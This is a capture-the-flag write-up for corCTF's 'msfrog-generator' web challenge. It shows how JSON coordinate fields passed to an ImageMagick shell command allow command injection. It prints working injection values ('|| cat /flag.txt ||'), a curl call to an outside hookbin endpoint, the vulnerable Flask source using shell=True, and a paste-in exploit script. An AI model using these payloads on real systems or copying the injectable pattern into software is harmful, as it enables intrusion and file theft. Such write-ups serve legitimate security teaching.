# msfrog-generator
**web exploitation (web) - 109 points**
https://2022.cor.team/challs
Description:
```
The vanilla msfrog is hard to beat, but this webapp allows you to make it even better!
```
# Table of Contents
1. [First look](#first-look)
2. [Looking at the source](#source-look)
3. [Messing around with the POST request](#post)
4. [Exploiting the RCE to get the flag](#rce)
5. [Looking at the server files](#server)
6. ["get flag" script](#getflag)
8. [TL;DR](#tldr)

## First look <a name="first-look">
The challenge gave us a link to a webpage that looks like this\\
![webpage](https://i.imgur.com/MIBxABW.png)\\
It is a game where you can add upto 3 items to the canvas and move them around.\\
Clicking the generate button will download an image of the canvas.

## Looking at the source <a name="source-look">
Opening the dev tools in chrome, first thing we see in the source is a note in the comments
```
 NOTE: There is no (intended) vuln in the frontend, please don't waste your time digging into the JS ;)
```
![note-in-comments](https://i.imgur.com/Ifhe3ig.png)\\
So, this means that the intended vulnerability is server-side.\\
Looking at the `sources` tab, the file structure ressembles that of a typical React application.\\
![sources-tab](https://i.imgur.com/R0V7nVm.png)\\
Next 5 minutes I looked at the sources and found that on clicking the `generate` button, the page sends a post request to `/api/generate` with the data of the items placed on the canvas.\\
![POST-request](https://i.imgur.com/1SzNwM0.png)\\
The server responds with base64 data of the image to be downloaded.

## Messing around with the POST request <a name="post">
I had a feeling that the contents of the request are passed through shell command, which means there might be RCE, so I created an endpoint on hookbin and tried to curl it.
```js
jsonData=[
	{"type":"mstongue.png","pos":{"x":0,"y":0}},
	{"type":"mskiss.png","pos":{"x":140,"y":27}},
	{"type":"msanger.png","pos":{"x":85,"y":132}},
	{
		"type":`$(curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/03JmgD39O1c3Mkp3KeXq)`,
		"pos":{
			"x":100,
			"y":100,
		}
	}
]
let response = await fetch("/api/generate", {
	method: "POST",
	headers: {
		"Content-Type": "application/json",
	},
	body: JSON.stringify(jsonData),
});
if (response.status !== 200)
	console.log( `Unexpected response: ${response.status}`);
response = await response.json();
```
In response, the server sent a string\\
![non-existing-img](https://i.imgur.com/JtPxdjE.png)\\
So I tried doing it with coordinates
```js
{
    "type":`mspoop.png`,
	"pos":{
		"x":`100`,
		"y":`$(curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/03JmgD39O1c3Mkp3KeXq)`,
	}
}
```
but it just sent another base64 image data response.\\
So then I tried using && with coordinates
```js
{
	"type":`mspoop.png`,
	"pos":{
		"x":`100`,
		"y":`100 && curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/03JmgD39O1c3Mkp3KeXq`,
	}
}
```
This time it responded with the string \\
```
Something went wrong :
b"convert-im6.q16: missing an image filename `+100+100' @ error/convert.c/ConvertImageCommand/3226.\n"
```
Aha! So it uses imagemagick to combine the images.\\
The `||` operator in shell executes the next command if the previous command fails.\\
So I replaced `&&` with `||` and also placed `||` at the end
```js
"pos":{
		"x":`100`,
		"y":`100 || curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/03JmgD39O1c3Mkp3KeXq ||`,
}
```
Server resonded with
```
Something went wrong : b"convert-im6.q16: missing an image filename `+100+100\' @ error/convert.c/ConvertImageCommand/3226.\n % Total % Received % Xferd Average Speed Time Time Time Current\n Dload Upload Total Spent Left Speed\n\r 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:02 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:03 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:04 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:05 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:06 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:07 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:08 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:09 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:10 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:11 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:12 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:13 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:14 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:15 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:16 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:17 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:18 --:--:-- 0\r 0 0 0 0 0 0 0 0 --:--:-- 0:00:19 --:--:-- 0curl: (6) Could not resolve host: hookb.in\n/bin/sh: 1: -composite: not found\n"
```
RCE accomplished! Though the curl command failed showing could not resolve host, we can now try other commands like `ls`
and the server responded with
```
{"msfrog": "fe\nimg\nserver.py\nwsgi.py\n"}
```
## Exploiting the RCE to get the flag <a name="rce">
Now that we have successfully found a way to execute arbitrary code on the server, all there's left to do is to find where the flag is located.
I will now list the commands and outputs that led me to the flag.

**pwd**
```
{"msfrog": "/app\n"}
```
**echo $(cd / && ls)**
```
{"msfrog": "app bin boot dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var\n"}
```
**cat /flag.txt**
```
{"msfrog": "corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}\n"}
```
## Looking at the server files
Now that we have found the flag, why not take a look at the `server.py` file we found in `/app`
```py
import os
import json
import subprocess
from flask import Flask, send_from_directory, request

app = Flask(__name__, static_folder='fe')


@app.route('/api/generate', methods=['POST'])
def generate_msfrog():
    # Check if we received JSON
    if not request.is_json:
        return "I only speak JSON :c", 400

    # Grab all the msfrog accessoires
    accessoires = None
    try:
        accessoires = request.get_json()
    except:
        return "nice json", 400
        
    if not accessoires or not isinstance(accessoires, list):
        return ":msfrog:", 400

    composites = []
    for accessoire in accessoires:
        if 'type' not in accessoire:
            return "missing type lmao", 400
        
        type = accessoire['type']
        pos = accessoire.get('pos', None)
        if not pos or not isinstance(pos, dict):
            return "Ehh I need the position to supply to imagemagick", 400

        x = pos.get('x', None)
        y = pos.get('y', None)

        if not isinstance(type, str):
            return "missing type lmao", 400

        # Anti haxxor check
        if not os.path.exists("./img/" + os.path.basename(type)):
            return "I wont pass a non existing image to a shell command lol", 400

        if x is None or y is None:
            return "Ehh I need the position to supply to imagemagick", 400

        composites.append(f"img/{type} -geometry +{x}+{y} -composite")

    try:
        result = subprocess.run(
            f"convert img/base.png {' '.join(composites)} -trim png:- | base64 -w0", capture_output=True, shell=True)
        if result.returncode != 0 or len(result.stdout) == 0:
            return f"Something went wrong :\n{result.stderr}", 500
        return json.dumps({"msfrog": result.stdout.decode('utf8')})
    except:
        return json.dumps({"msfrog": "error"})


@ app.route('/')
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')


@ app.route('/<path:path>')
def serve_react(path):
    if path != "" and os.path.exists(app.static_folder + '/' + path):
        return send_from_directory(app.static_folder, path)
    else:
        return "File not found", 404


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
```
## "get flag" script <a name="getflag">
I am not that great in writing fancy bash scripts, but pasting the following in the js console will get the flag for you ;)
```js
jsonData=[
	{"type":"mstongue.png","pos":{"x":0,"y":0}},
	{"type":"mskiss.png","pos":{"x":140,"y":27}},
	{"type":"msanger.png","pos":{"x":85,"y":132}},
	{
		"type":`mspoop.png`,
		"pos":{
			"x":`100`,
			"y":`100 || cat /flag.txt ||`,
		}
	}
]
let response = await fetch("/api/generate", {
	method: "POST",
	headers: {
		"Content-Type": "application/json",
	},
	body: JSON.stringify(jsonData),
}).then(r=>r.json()).then(data=>console.log(data.msfrog));
```
## TL;DR <a name="tldr">
The server uses imagemagick to combine the images and generates base64 data based on the contents of the POST request.\\
We can achieve RCE by giving `|| <your command> ||` in place of a coordinate.\\

The output flag is `corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}`
